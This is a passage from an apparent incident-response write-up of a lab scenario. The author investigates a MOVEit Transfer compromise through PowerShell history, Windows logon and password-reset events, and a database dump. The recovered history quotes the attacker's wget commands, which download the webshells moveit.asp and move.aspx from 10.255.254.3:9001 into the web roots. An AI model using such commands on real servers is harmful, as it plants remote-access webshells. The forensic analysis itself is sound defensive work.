It’s interesting that I find a second file with move.aspx in it. This one, move.aspx.cdcab7d2.compiled is where .NET is caching the compiled ASPX file when it’s used. I’ll note that the timestamp here of 11:24:43 matches the IIS logs for when the actor first ties to interact with the webshell.

PowerShell History
Locate
There are Powershell history files in both the Administrator and moveitsvs user’s AppData directories:

oxdf@hacky$ find . -name ConsoleHost_history.txt
Triage/uploads/auto/C%3A/Users/moveitsvc.WIN-LR8T2EF8VHM.002/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
Triage/uploads/auto/C%3A/Users/Administrator/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
Data
The administrator’s history only has a single command, netstat. The moveitsvc user’s history seems to have captured some of the commands run by the attacker:

cd C:\inetpub\wwwroot
wget http://10.255.254.3:9001/moveit.asp
dir
wget http://10.255.254.3:9001/moveit.asp -OutFile moveit.asp
dir
cd C:\MOVEitTransfer\wwwroot
wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx
So once the actor got execution via the SQL injection, it looks like they used it to run the PowerShell wget command to download both webshells.

Event Logs
Process
Locate
The event logs on a Windows machine are stored in C:\Windows\System32\winevt\Logs. Luckily, Kape collected those in this event:

image-20231116181151876
To CSV/JSON
I could look at those individually with the event log viewer, but to quickly search through them all, I’ll convert them to JSON using EvtxECmd.exe, which has a similar format to MFTECmd.exe:

C:\Tools\ZimmermanTools> EvtxECmd.exe -d C:\Users\0xdf\Desktop\Logs --json Z:\hackthebox-sherlocks\i-like-to\
...[snip]...
There’s a ton of output, but the result is a large .json file. The structure of the output is a nested JSON that looks like this:

oxdf@hacky$ cat 20231117100542_EvtxECmd_Output.json | jq -c . | head -1 | jq .
{
  "ChunkNumber": 0,
  "Computer": "WIN-LR8T2EF8VHM",
  "Payload": "{\"EventData\":{\"Data\":[{\"@Name\":\"param1\",\"#text\":\"86400\"},{\"@Name\":\"param2\",\"#text\":\"SuppressDuplicateDuration\"},{\"@Name\":\"param3\",\"#text\":\"Software\\\\Microsoft\\\\EventSystem\\\\EventLog\"}]}}",
  "Channel": "Application",
  "Provider": "Microsoft-Windows-EventSystem",
  "EventId": 4625,
  "EventRecordId": "1",
  "ProcessId": 0,
  "ThreadId": 0,
  "Level": "Info",
  "Keywords": "0x80000000000000",
  "SourceFile": "Logs\\Application.evtx",
  "ExtraDataOffset": 0,
  "HiddenRecord": false,
  "TimeCreated": "2020-04-10T17:46:56.5347710+00:00",
  "RecordNumber": 1
}
I’m using jq with -c to print one log per line, then head -1 to get just the first log, then jq to pretty print. The Payload object is what has the actual log data, with the rest of the fields having metadata about the log.

I can also convert it to CSV with --csv instead of --json. This is nicer in that it doesn’t have the nested payload issue. The downside is that the lines are really long, and using cut or awk to select by column is a pain.

Timeline Explorer
Another Eric Zimmerman tool is Timeline Explorer, which will read in either format of the output. Like MFTExplorer, It takes a long time to load data, but once it loads, it provides a nice filterable way to work through the data. It can also read the MSF output as well. I won’t use it here, but it’s a nice tool if you have the time to wait for it to load data.

Login Events
Overview
Looking for suspicious logins during the timeframe of the incident is always a good thing to hunt for. Successful logins create a 4624 event on the local host. This post has good details. There are over seven thousand of these in the event logs:

oxdf@hacky$ cat 20231117095725_EvtxECmd_Output.csv | awk -F ',' '$4 == 4624' | wc -l
7071
I’m using awk to select only rows where the 4th (starting from 1) item is 4624.

I’m going to need to filter that a bit. The Login Type is very useful here. It happens to show up in the 17th column, so I can use cut (or awk, I’m just better with cut) to get only that column and then sort | uniq -c | sort -nr for histogram:

oxdf@hacky$ cat 20231117095725_EvtxECmd_Output.csv | awk -F ',' '$4 == 4624' | cut -d, -f17 | sort | uniq -c | sort -nr
   6221 LogonType 5
    591 LogonType 4
    196 LogonType 2
     36 LogonType 0
     25 LogonType 3
      2 LogonType 10
Type 2 is someone sitting at the keyboard and logging in. Unless we are looking at insider threat, it won’t be interesting to me. Type 5 is a service starting. That could be interesting if an attacker is making a service, but given the sheer volume, not where I’d go not. Similarly, type 4 is scheduled tasks.

Type 3 is a remote network login, and type 10 is remote desktop. These are a good starting place.

Type 3
There are 25 type 3 logon events. I’ll use awk again to filter getting only the first row (NR==1) and the 4624 events, this time also only getting if the 17th item is “LogonType 3”. Then I’ll use cut to get some select fields:

oxdf@hacky$ cat 20231117095725_EvtxECmd_Output.csv | awk -F ',' 'NR==1 || ($4 == 4624 && $17 == "LogonType 3")' | cut -d, -f3,10,14,16-21 | sort -r
TimeCreated,Computer,UserName,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6
2023-07-12 11:11:15.8497783,mover,-\-,Target: MOVER\moveitsvc,LogonType 3,LogonId: 0x80F6432,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-21 06:54:32.3634520,IMMOVABLE,-\-,Target: IMMOVABLE\Administrator,LogonType 3,LogonId: 0x1E5AA81,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-21 06:49:18.9041350,IMMOVABLE,-\-,Target: IMMOVABLE\Administrator,LogonType 3,LogonId: 0x1E17496,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-21 06:47:57.4691850,IMMOVABLE,-\-,Target: IMMOVABLE\Administrator,LogonType 3,LogonId: 0x1E0A1A6,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-21 04:50:53.9346606,IMMOVABLE,-\-,Target: IMMOVABLE\Administrator,LogonType 3,LogonId: 0x5E8DF,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-19 09:07:04.7374544,IMMOVABLE,-\-,Target: IMMOVABLE\Administrator,LogonType 3,LogonId: 0x2CAF8,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-14 06:48:32.0781101,WIN-LR8T2EF8VHM,-\-,Target: WIN-LR8T2EF8VHM\Administrator,LogonType 3,LogonId: 0x11C2922,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 13:31:10.6380860,WIN-LR8T2EF8VHM,-\-,Target: WIN-LR8T2EF8VHM\Administrator,LogonType 3,LogonId: 0x11FC50,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 13:05:25.4865355,WIN-LR8T2EF8VHM,-\-,Target: WIN-LR8T2EF8VHM\Administrator,LogonType 3,LogonId: 0x35108,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 10:10:37.8800316,WIN-LR8T2EF8VHM,-\-,Target: WIN-LR8T2EF8VHM\Administrator,LogonType 3,LogonId: 0xBE045D,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 09:40:55.9385428,WIN-LR8T2EF8VHM,-\-,Target: WIN-LR8T2EF8VHM\Administrator,LogonType 3,LogonId: 0x77F448,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 08:17:38.6988255,IMMOVABLE,-\-,Target: IMMOVABLE\Administrator,LogonType 3,LogonId: 0xB6A0E,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 08:17:31.1379031,IMMOVABLE,-\-,Target: IMMOVABLE\Administrator,LogonType 3,LogonId: 0xB62B3,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 08:17:07.0279108,IMMOVABLE,-\-,Target: IMMOVABLE\Administrator,LogonType 3,LogonId: 0xB3F94,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 08:05:36.6329820,IMMOVABLE,-\-,Target: IMMOVABLE\Administrator,LogonType 3,LogonId: 0xE9B9A,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 08:02:25.5280063,IMMOVABLE,-\-,Target: IMMOVABLE\Administrator,LogonType 3,LogonId: 0xCD5A2,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 08:01:57.1007002,IMMOVABLE,-\-,Target: IMMOVABLE\Administrator,LogonType 3,LogonId: 0xCA56B,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 08:01:19.8360665,IMMOVABLE,-\-,Target: IMMOVABLE\Administrator,LogonType 3,LogonId: 0xA7406,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 08:01:15.9307237,IMMOVABLE,-\-,Target: IMMOVABLE\Administrator,LogonType 3,LogonId: 0xA4FA1,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 08:01:06.0784498,IMMOVABLE,-\-,Target: IMMOVABLE\Administrator,LogonType 3,LogonId: 0x9CE80,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 08:00:01.9354388,IMMOVABLE,-\-,Target: IMMOVABLE\Administrator,LogonType 3,LogonId: 0x5786A,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 07:33:52.0094772,WIN-LR8T2EF8VHM,-\-,Target: WIN-LR8T2EF8VHM\Administrator,LogonType 3,LogonId: 0x127649,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 07:26:28.5101125,WIN-LR8T2EF8VHM,-\-,Target: WIN-LR8T2EF8VHM\Administrator,LogonType 3,LogonId: 0x9A37D,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 07:25:48.6119767,WIN-LR8T2EF8VHM,-\-,Target: WIN-LR8T2EF8VHM\Administrator,LogonType 3,LogonId: 0x8EB93,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
2023-06-13 07:25:20.4935739,WIN-LR8T2EF8VHM,-\-,Target: WIN-LR8T2EF8VHM\Administrator,LogonType 3,LogonId: 0x88DA5,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",
All of these events are logons by the administrator. Only one of these events takes place around the time of the attack, so I’ll want to note that event:

oxdf@hacky$ cat 20231117100542_EvtxECmd_Output.json | jq '. | select (.TimeCreated == "2023-07-12T11:11:15.8497783+00:00")'
{
  "PayloadData1": "Target: MOVER\\moveitsvc",
  "PayloadData2": "LogonType 3",
  "PayloadData3": "LogonId: 0x80F6432",
  "PayloadData4": "AuthenticationPackageName: NTLM",
  "PayloadData5": "LogonProcessName: NtLmSsp ",
  "UserName": "-\\-",
  "RemoteHost": "maroc (10.255.254.3)",
  "ExecutableInfo": "-",
  "MapDescription": "Successful logon",
  "ChunkNumber": 132,
  "Computer": "mover",
  "Payload": "{\"EventData\":{\"Data\":[{\"@Name\":\"SubjectUserSid\",\"#text\":\"S-1-0-0\"},{\"@Name\":\"SubjectUserName\",\"#text\":\"-\"},{\"@Name\":\"SubjectDomainName\",\"#text\":\"-\"},{\"@Name\":\"SubjectLogonId\",\"#text\":\"0x0\"},{\"@Name\":\"TargetUserSid\",\"#text\":\"S-1-5-21-4088429403-1159899800-2753317549-1006\"},{\"@Name\":\"TargetUserName\",\"#text\":\"moveitsvc\"},{\"@Name\":\"TargetDomainName\",\"#text\":\"MOVER\"},{\"@Name\":\"TargetLogonId\",\"#text\":\"0x80F6432\"},{\"@Name\":\"LogonType\",\"#text\":\"3\"},{\"@Name\":\"LogonProcessName\",\"#text\":\"NtLmSsp \"},{\"@Name\":\"AuthenticationPackageName\",\"#text\":\"NTLM\"},{\"@Name\":\"WorkstationName\",\"#text\":\"maroc\"},{\"@Name\":\"LogonGuid\",\"#text\":\"00000000-0000-0000-0000-000000000000\"},{\"@Name\":\"TransmittedServices\",\"#text\":\"-\"},{\"@Name\":\"LmPackageName\",\"#text\":\"NTLM V2\"},{\"@Name\":\"KeyLength\",\"#text\":\"128\"},{\"@Name\":\"ProcessId\",\"#text\":\"0x0\"},{\"@Name\":\"ProcessName\",\"#text\":\"-\"},{\"@Name\":\"IpAddress\",\"#text\":\"10.255.254.3\"},{\"@Name\":\"IpPort\",\"#text\":\"0\"},{\"@Name\":\"ImpersonationLevel\",\"#text\":\"%%1833\"},{\"@Name\":\"RestrictedAdminMode\",\"#text\":\"-\"},{\"@Name\":\"TargetOutboundUserName\",\"#text\":\"-\"},{\"@Name\":\"TargetOutboundDomainName\",\"#text\":\"-\"},{\"@Name\":\"VirtualAccount\",\"#text\":\"%%1843\"},{\"@Name\":\"TargetLinkedLogonId\",\"#text\":\"0x0\"},{\"@Name\":\"ElevatedToken\",\"#text\":\"%%1843\"}]}}",
  "Channel": "Security",
  "Provider": "Microsoft-Windows-Security-Auditing",
  "EventId": 4624,
  "EventRecordId": "60776",
  "ProcessId": 652,
  "ThreadId": 1388,
  "Level": "LogAlways",
  "Keywords": "Audit success",
  "SourceFile": "Logs\\Security.evtx",
  "ExtraDataOffset": 0,
  "HiddenRecord": false,
  "TimeCreated": "2023-07-12T11:11:15.8497783+00:00",
  "RecordNumber": 60776
}
In the end, I won’t find anything malicious here.

Type 10
I’ll run the same command, swapping type 3 for type 10, and there’s only two results:

oxdf@hacky$ cat 20231117095725_EvtxECmd_Output.csv | awk -F ',' 'NR==1 || ($4 == 4624 && $17 == "LogonType 10")' | cut -d, -f3,10,14,16-21 | sort -r 
TimeCreated,Computer,UserName,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6
2023-07-12 11:11:18.6654617,mover,HTB\MOVER$,Target: MOVER\moveitsvc,LogonType 10,LogonId: 0x81007B8,AuthenticationPackageName: Negotiate,"LogonProcessName: User32 ",
2023-07-12 11:11:18.6654341,mover,HTB\MOVER$,Target: MOVER\moveitsvc,LogonType 10,LogonId: 0x810079B,AuthenticationPackageName: Negotiate,"LogonProcessName: User32 ",
This is very interesting. The movesvc account (which would make sense as the account that is running MOVEit) is RDPing into the host. I’ll add this event at 11:11:18 to my timeline for sure.

Password Change
Windows logs when a user changes their own password in 4723 and password resets in 4724.

There are no 4723 logs on this system, but there are 4724s:

oxdf@hacky$ cat 20231117095725_EvtxECmd_Output.csv | awk -F ',' 'NR==1 || ($4 == 4724 )' | cut -d, -f3,14,16-21 | sort -r
TimeCreated,UserName,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6
2023-07-12 11:09:27.8648235,MOVER\moveitsvc (S-1-5-21-4088429403-1159899800-2753317549-1006),Target: MOVER\moveitsvc (S-1-5-21-4088429403-1159899800-2753317549-1006),SubjectLogonId: 0x8D5AB,,,,
2023-07-12 08:34:24.5662307,MOVER\Administrator (S-1-5-21-4088429403-1159899800-2753317549-500),Target: MOVER\dfir (S-1-5-21-4088429403-1159899800-2753317549-1007),SubjectLogonId: 0x7E59E38,,,,
2023-06-14 09:21:11.0111386,WIN-LR8T2EF8VHM\Administrator (S-1-5-21-4088429403-1159899800-2753317549-500),Target: WIN-LR8T2EF8VHM\moveitsvc (S-1-5-21-4088429403-1159899800-2753317549-1006),SubjectLogonId: 0x8B1B5,,,,
2023-06-14 07:13:49.1113255,WIN-LR8T2EF8VHM\Administrator (S-1-5-21-4088429403-1159899800-2753317549-500),Target: WIN-LR8T2EF8VHM\moveitsvc (S-1-5-21-4088429403-1159899800-2753317549-1005),SubjectLogonId: 0x5CA70,,,,
2023-06-13 15:53:07.1870581,WIN-LR8T2EF8VHM\Administrator (S-1-5-21-4088429403-1159899800-2753317549-500),Target: WIN-LR8T2EF8VHM\moveitsvc (S-1-5-21-4088429403-1159899800-2753317549-1004),SubjectLogonId: 0x84417,,,,
2023-06-13 10:57:56.5023390,WIN-LR8T2EF8VHM\Administrator (S-1-5-21-4088429403-1159899800-2753317549-500),Target: WIN-LR8T2EF8VHM\moveitsvc (S-1-5-21-4088429403-1159899800-2753317549-1001),SubjectLogonId: 0x605087,,,,
2023-06-13 10:01:06.0105821,WIN-LR8T2EF8VHM\Administrator (S-1-5-21-4088429403-1159899800-2753317549-500),Target: WIN-LR8T2EF8VHM\moveitsvc (S-1-5-21-4088429403-1159899800-2753317549-1000),SubjectLogonId: 0x605087,,,,
2023-06-13 08:17:31.3734335,IMMOVABLE\Administrator (S-1-5-21-4088429403-1159899800-2753317549-500),Target: IMMOVABLE\Administrator (S-1-5-21-4088429403-1159899800-2753317549-500),SubjectLogonId: 0xB3F94,,,,
The events in June show the administrator account changing its and then several times the moveitsvc’s password. There are also two events from the day of the incident, where the administrator changes the dfir user, and the moveitsvc user changes their own password. That moveitsvc one is right in the middle of the other activity at 11:09:27, just before the actor connects over RDP.

SQL Dump
Data
In the Triage/uploads folder, there’s a moveit.sql file:

oxdf@hacky$ ls Triage/uploads
auto  moveit.sql  ntfs
This a dump of the database, with all the commands to recreate the database, creating tables and then inserting data into them.

I would love to have a GUI tool that allows me to analyze this data, but I’m not aware of one. I could install MySQL on my VM and then populate it with this dump and examine it with any database tool. At this moment, I’m going to take a more lazy approach, working with grep and searching.

InstID
One of the questions for this sherlock is the InstId of the attacker. The database has a fair number of tables:

oxdf@hacky$ grep -i "Create Table" Triage/uploads/moveit.sql
CREATE TABLE `activesessions` (
CREATE TABLE `allowedhostsinheader` (
CREATE TABLE `authcodes` (
CREATE TABLE `authsources` (
CREATE TABLE `certinfo` (
CREATE TABLE `contentscan` (
CREATE TABLE `customnotify` (
CREATE TABLE `delayednotifications` (
CREATE TABLE `displayprofiles` (
CREATE TABLE `dlprules` (
CREATE TABLE `dlprulesets` (
CREATE TABLE `downloadinfo` (
CREATE TABLE `expirationpolicies` (
CREATE TABLE `failedaccess` (
CREATE TABLE `favoritefilters` (
CREATE TABLE `fedidpcerts` (
CREATE TABLE `fedidpendpoints` (
CREATE TABLE `fedidps` (
CREATE TABLE `filedownloadinfo` (
CREATE TABLE `filedownloadtoken` (
CREATE TABLE `files` (
CREATE TABLE `filetypes` (
CREATE TABLE `fileuploadinfo` (
CREATE TABLE `folderfile` (
CREATE TABLE `foldernotifstamps` (
CREATE TABLE `folderperminfo` (
CREATE TABLE `folderperms` (
CREATE TABLE `folders` (
CREATE TABLE `folderuser` (
CREATE TABLE `groupnotify` (
CREATE TABLE `groups` (
CREATE TABLE `groupuser` (
CREATE TABLE `guestfileaccess` (
CREATE TABLE `hostpermits` (
CREATE TABLE `institutions` (
CREATE TABLE `keyrotationstate` (
CREATE TABLE `log` (
CREATE TABLE `loglh` (
CREATE TABLE `msgposts` (
CREATE TABLE `newfiles` (
CREATE TABLE `nodestatus` (
CREATE TABLE `packageclassificationtypes` (
CREATE TABLE `passwordpolicies` (
CREATE TABLE `pendingrequests` (
CREATE TABLE `publiclinks` (
CREATE TABLE `refreshtokens` (
CREATE TABLE `registryaudit` (
CREATE TABLE `reports` (
CREATE TABLE `samlmsgs` (
CREATE TABLE `schema_version` (
CREATE TABLE `schemes` (
CREATE TABLE `sessionvars` (
CREATE TABLE `sysstats` (
CREATE TABLE `systemsettings` (
CREATE TABLE `taskaudit` (
CREATE TABLE `trustedexternaltokenproviders` (
CREATE TABLE `userexternaltokens` (
CREATE TABLE `userhostpermits` (
CREATE TABLE `users` (
CREATE TABLE `usersecurityquestions` (
CREATE TABLE `usertrustedmfadevices` (
CREATE TABLE `userunregaddrbook` (
CREATE TABLE `userusedmfacodes` (
CREATE TABLE `useruser` (
CREATE TABLE `wwwcertaudit` (
CREATE TABLE `wwwfileaudit` (
CREATE TABLE `xferstatus` (
expand
InstID shows up in a lot of them:

oxdf@hacky$ grep "InstID" Triage/uploads/moveit.sql
  `InstID` int NOT NULL DEFAULT '0',
  `ActAsInstID` int DEFAULT NULL,
  KEY `InstID` (`InstID`),
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  KEY `InstID` (`InstID`)
  `InstID` int NOT NULL DEFAULT '0',
  KEY `InstID` (`InstID`),
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  KEY `InstID` (`InstID`)
  `InstID` int NOT NULL DEFAULT '0',
  KEY `InstID` (`InstID`)
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  KEY `InstID` (`InstID`),
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  KEY `InstID` (`InstID`),
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  UNIQUE KEY `ReminderInfo` (`InstID`,`ReminderClass`,`ReminderType`,`ReminderTime`)
  `InstID` int NOT NULL DEFAULT '0',
  KEY `InstID` (`InstID`),
  `InstID` int NOT NULL DEFAULT '0',
  KEY `InstID` (`InstID`),
  `InstID` int NOT NULL DEFAULT '0',
  KEY `InstID` (`InstID`),
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  KEY `Template` (`Template`,`GroupID`,`InstID`)
  `InstID` int NOT NULL DEFAULT '0',
  KEY `InstID` (`InstID`),
  `InstID` int NOT NULL DEFAULT '0',
  KEY `InstID` (`InstID`),
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  KEY `InstID` (`InstID`),
  `InstID` int NOT NULL DEFAULT '0',
  KEY `InstID` (`InstID`),
  KEY `LogTimeIDInstAction` (`LogTime`,`ID`,`InstID`,`Action`)
  `InstID` int NOT NULL DEFAULT '0',
  UNIQUE KEY `InstID` (`InstID`)
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  KEY `InstID` (`InstID`),
  `InstID` int NOT NULL,
  UNIQUE KEY `UserQuestion` (`InstID`,`Username`,`QuestionID`)
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  `InstID` int NOT NULL DEFAULT '0',
  KEY `Username` (`Username`,`GroupID`,`InstID`),
expand
The users table has a few rows, but nothing super interesting there.

The log table seems to have events:

--
-- Table structure for table `log`
--

DROP TABLE IF EXISTS `log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `log` (
  `ID` bigint NOT NULL AUTO_INCREMENT,
  `LogTime` datetime DEFAULT NULL,
  `Action` varchar(16) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `InstID` int NOT NULL DEFAULT '0',
  `Username` varchar(128) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `FolderID` int NOT NULL DEFAULT '0',
  `FileID` varchar(12) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `IPAddress` varchar(16) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `Error` int NOT NULL DEFAULT '0',
  `Parm1` varchar(2500) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `Parm2` varchar(2500) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `Parm3` varchar(2500) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `Parm4` varchar(2500) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `Message` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci,
  `AgentBrand` varchar(1024) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `AgentVersion` varchar(16) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `XferSize` double DEFAULT '0',
  `Duration` double NOT NULL DEFAULT '0',
  `FileName` varchar(1024) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `FolderPath` varchar(2500) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `ResilNode` tinyint NOT NULL DEFAULT '0',
  `TargetID` varchar(128) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL DEFAULT '',
  `TargetName` varchar(128) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL DEFAULT '',
  `Hash` varchar(40) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `Cert` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci,
  `VirtualFolderID` int NOT NULL DEFAULT '0',
  `VirtualFolderPath` varchar(2500) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `CScanName` varchar(128) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL,
  `InterfaceType` tinyint DEFAULT NULL,
  `SuppressName` int NOT NULL DEFAULT '0',
  PRIMARY KEY (`ID`),
  KEY `LogTime` (`LogTime`),
  KEY `Action` (`Action`),
  KEY `InstID` (`InstID`),
  KEY `Username` (`Username`),
  KEY `FolderID` (`FolderID`),
  KEY `FileID` (`FileID`),
  KEY `IPAddress` (`IPAddress`),
  KEY `Error` (`Error`),
  KEY `TargetID` (`TargetID`),
  KEY `LogTimeIDInstAction` (`LogTime`,`ID`,`InstID`,`Action`)
) ENGINE=InnoDB AUTO_INCREMENT=88 DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;
expand
The inserts into this table are all on one line, so I’ll use grep to get it, cut to remove the “insert into” language, and then sed to replace ),( with )\n( to get one row per line. There’s a bunch from dates way before this incident that dont seem relevant, so I can grep to the incident date as well:

oxdf@hacky$ cat Triage/uploads/moveit.sql | grep "INSERT INTO \`log\` VALUES" | cut -d' ' -f5- | sed 's/),(/)\n(/g' | grep '2023-07-12'
(40,'2023-07-12 02:11:15','sec_signon',3636,'anonymous',0,'','10.255.254.3',2050,'','','','','Failed to sign on: There is no such user','MOVEit Transfer FTP','15.0.0.31',0,0,'','',0,'','','c66788d4d7ca1da7f57f2238b840663009cfcca8','',0,'','',40,0)
(41,'2023-07-12 02:11:15','sec_signon',3636,'anonymous',0,'','10.255.254.3',2417,'FTP','','','','Insecure FTP is not enabled','MOVEit Transfer FTP','15.0.0.31',0,0,'','',0,'','','f46377dcbb1bd462d0ba5bbd05ee7a7b6fa4335f','',0,'','',40,0)
(42,'2023-07-12 02:11:15','sec_signon',3636,'anonymous',0,'','10.255.254.3',2050,'','','','','Failed to sign on: There is no such user','MOVEit Transfer FTP','15.0.0.31',0,0,'','',0,'','','4cf54d4aa541ca00525e5ce8a4bff53da36faa29','',0,'','',40,0)
(43,'2023-07-12 02:11:15','sec_signon',3636,'anonymous',0,'','10.255.254.3',2050,'','','','','Failed to sign on: There is no such user','MOVEit Transfer FTP','15.0.0.31',0,0,'','',0,'','','de1128b8551c7b201b93d06c4e9499b437f55ae4','',0,'','',40,0)
(44,'2023-07-12 02:11:15','sec_signon',3636,'anonymous',0,'','10.255.254.3',2417,'FTP','','','','Insecure FTP is not enabled','MOVEit Transfer FTP','15.0.0.31',0,0,'','',0,'','','804fc0419b81ba9360ce0efe4bc14e238cb9ba86','',0,'','',40,0)
(45,'2023-07-12 02:11:15','sec_signon',3636,'anonymous',0,'','10.255.254.3',2417,'FTP','','','','Insecure FTP is not enabled','MOVEit Transfer FTP','15.0.0.31',0,0,'','',0,'','','c745089b0778ac200e9d9e72fd6aa6defee6f0fd','',0,'','',40,0)
(50,'2023-07-12 02:25:03','msg_post',1234,'Guest:APCUVWMP@WCUURAXH.com',966871855,'0','10.255.254.3',4400,'','0','','','Package must have at least one valid recipient.','Ruby','',0,0,'','/Messages/Global Messaging',0,'','','b8e83822ff1d4578dd4908afb8c44f95bc3c8046','',966871855,'/Messages/Global Messaging','',10,0)
(51,'2023-07-12 02:25:55','sec_signon',3636,'vcjoaquq',0,'','10.255.254.3',2050,'','','','','Failed to sign on: There is no such user','Firefox Browser','102.0',0,0,'','',0,'','','1ec28c66956851f6060f28b17b60354911c5f390','',0,'','',10,0)
(52,'2023-07-12 02:26:15','sec_signon',3636,'icfshlla',0,'','10.255.254.3',2050,'','','','','Failed to sign on: There is no such user','Firefox Browser','102.0',0,0,'','',0,'','','e3b18a7f31a1578d044395b1a1e2f3671aff6bb5','',0,'','',10,0)
(57,'2023-07-12 02:47:11','msg_post',1234,'Guest:AQCSOIFB@YSNSKCUY.com',966871855,'0','10.255.254.3',4400,'','0','','','Package must have at least one valid recipient.','Ruby','',0,0,'','/Messages/Global Messaging',0,'','','9a483b59e0960ab38798ceea5900842e11b46216','',966871855,'/Messages/Global Messaging','',10,0)
(62,'2023-07-12 03:01:05','msg_post',1234,'Guest:RWYBAGIC@HEXGVNAY.com',966871855,'0','10.255.254.3',4400,'','0','','','Package must have at least one valid recipient.','Ruby','',0,0,'','/Messages/Global Messaging',0,'','','4076bf57319439239ea8f145fd3450f6f312542b','',966871855,'/Messages/Global Messaging','',10,0)
(67,'2023-07-12 03:01:56','msg_post',1234,'Guest:MHRFUQCI@LJJNDBUY.com',966871855,'0','10.255.254.3',4400,'','0','','','Package must have at least one valid recipient.','Ruby','',0,0,'','/Messages/Global Messaging',0,'','','af7dbfa81b0f63f6122e0a8aa736ec76d7cbc659','',966871855,'/Messages/Global Messaging','',10,0)
